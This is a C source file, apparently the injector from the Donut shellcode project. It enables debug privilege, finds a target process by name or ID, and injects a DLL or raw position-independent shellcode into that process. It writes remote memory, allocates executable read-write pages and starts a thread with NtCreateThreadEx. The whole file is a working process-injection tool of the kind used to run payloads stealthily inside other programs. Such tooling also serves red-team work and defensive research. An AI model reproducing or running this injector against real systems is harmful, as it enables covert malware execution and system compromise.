/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#include "ntlib/ntddk.h"

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t) (
    OUT  PHANDLE ThreadHandle, 
    IN  ACCESS_MASK DesiredAccess, 
    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, 
    IN  HANDLE ProcessHandle,
    IN  PVOID StartRoutine,
    IN  PVOID Argument OPTIONAL,
    IN  ULONG CreateFlags,
    IN  ULONG_PTR ZeroBits, 
    IN  SIZE_T StackSize OPTIONAL,
    IN  SIZE_T MaximumStackSize OPTIONAL, 
    IN  PVOID AttributeList OPTIONAL);

BOOL EnablePrivilege(PCHAR szPrivilege){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult) return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
    if(bResult){
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

      // adjust token
      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
    return bResult;
}

// display error message for last error code
VOID xstrerror (PCHAR fmt, ...){
    PCHAR  error=NULL;
    va_list arglist;
    CHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    vsnprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPSTR)&error, 0, NULL))
    {
      printf("  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      printf("  [ %s error : %08lX\n", buffer, dwError);
    }
}

DWORD name2pid(PCHAR procName){
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          pid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(!lstrcmpi(pe32.szExeFile, procName)){
          pid=pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return pid;
}

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

typedef HMODULE (WINAPI *LoadLibrary_t)(LPCTSTR);

BOOL injectDLL(DWORD id, PCHAR szPath) {
    SIZE_T             wr;
    LoadLibrary_t      pLoadLibrary;
    HANDLE             hp,ht;
    LPVOID             pPath;
    SIZE_T             pathLen = lstrlen(szPath);
    NtCreateThreadEx_t pNtCreateThreadEx;
    HMODULE            hn;
    NTSTATUS           nt=~0UL;
    
    // resolve API address 
    hn = GetModuleHandle("ntdll.dll");
    pNtCreateThreadEx=(NtCreateThreadEx_t)
        GetProcAddress(hn, "NtCreateThreadEx");
    
    // 1. open the target process
    hp=OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
    
    // 2. allocate read-write (RW) memory for DLL path
    pPath=VirtualAllocEx(hp, NULL, pathLen, 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 3. copy the path of DLL to remote memory
    WriteProcessMemory(hp, pPath, szPath, pathLen+1, &wr); 
    
    // 4. resolve the address of LoadLibrary
    pLoadLibrary=(LoadLibrary_t)GetProcAddress(
        GetModuleHandle("kernel32"), "LoadLibraryA");
      
    // 5. execute LoadLibrary in remote process 
    // with DLL path as parameter
    nt=pNtCreateThreadEx(&ht, MAXIMUM_ALLOWED, NULL, 
      hp, (LPTHREAD_START_ROUTINE)pLoadLibrary, pPath, 
      0,0,0,0,NULL);
      
    SetLastError(RtlNtStatusToDosError(nt));
    xstrerror("NtCreateThreadEx");
    
    // 6. close remote thread handle
    CloseHandle(ht);
    
    // 7. free remote memory
    VirtualFreeEx(hp, pPath, pathLen, 
      MEM_RELEASE | MEM_DECOMMIT);

    // 8. close remote process handle
    CloseHandle(hp);
    return nt==STATUS_SUCCESS;
}

BOOL injectPIC(DWORD id, LPVOID code, DWORD code_len, LPVOID data, DWORD data_len) {
    SIZE_T             wr;
    HANDLE             hp, ht;
    LPVOID             cs, ds;
    NtCreateThreadEx_t pNtCreateThreadEx;
    HMODULE            hn;
    NTSTATUS           nt=~0UL;
    
    // 1. resolve API address 
    hn = GetModuleHandle("ntdll.dll");
    pNtCreateThreadEx=(NtCreateThreadEx_t)
        GetProcAddress(hn, "NtCreateThreadEx");
    
    // 2. open the target process
    hp=OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
    
    // 3. allocate executable-read-write (XRW) memory for payload
    cs=VirtualAllocEx(hp, NULL, code_len, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    ds=VirtualAllocEx(hp, NULL, data_len, 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
    // 4. copy the payload to remote memory
    WriteProcessMemory(hp, cs, code, code_len, &wr); 
    WriteProcessMemory(hp, ds, data, data_len, &wr); 
      
    // 5. execute payload in remote process
    nt=pNtCreateThreadEx(&ht, MAXIMUM_ALLOWED, NULL, 
      hp, (LPTHREAD_START_ROUTINE)cs, ds, 
      0,0,0,0,NULL);
      
    SetLastError(RtlNtStatusToDosError(nt));
    xstrerror("NtCreateThreadEx");
    
    // wait a few seconds
    Sleep(1000*3);
    
    // 6. close remote thread handle
    CloseHandle(ht);
    
    // 7. free remote code
    VirtualFreeEx(hp, cs, code_len, 
      MEM_RELEASE | MEM_DECOMMIT);

    // 7. free remote data
    VirtualFreeEx(hp, ds, data_len, 
      MEM_RELEASE | MEM_DECOMMIT);
      
    // 8. close remote process handle
    CloseHandle(hp);
    return nt==STATUS_SUCCESS;
}

DWORD getdata(PCHAR path, LPVOID *data){
    HANDLE hf;
    DWORD  len,rd=0;
    
    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *data=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *data, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

int main(int argc, char *argv[]){
    LPVOID code, data;
    SIZE_T code_len, data_len;
    DWORD  pid;

    if (argc < 4){
      printf("usage: inject /pic /dll <process id | process name> <donut code> <donut data>\n");
      return 0;
    }
    
    EnablePrivilege(SE_DEBUG_NAME);
    
    // get pid
    pid=atoi(argv[2]);
    if(pid==0) pid=name2pid(argv[2]);
    
    // pic or dll?
    if(strcmpi("/pic", argv[1])==0){
      code_len = getdata(argv[3], &code);
      data_len = getdata(argv[4], &data);
      
      injectPIC(pid, code, code_len, data, data_len);
      free(code);
      free(data);
    } else if (strcmpi("/dll", argv[1])==0){
      injectDLL(pid, argv[3]);
    }
    return 0;
}
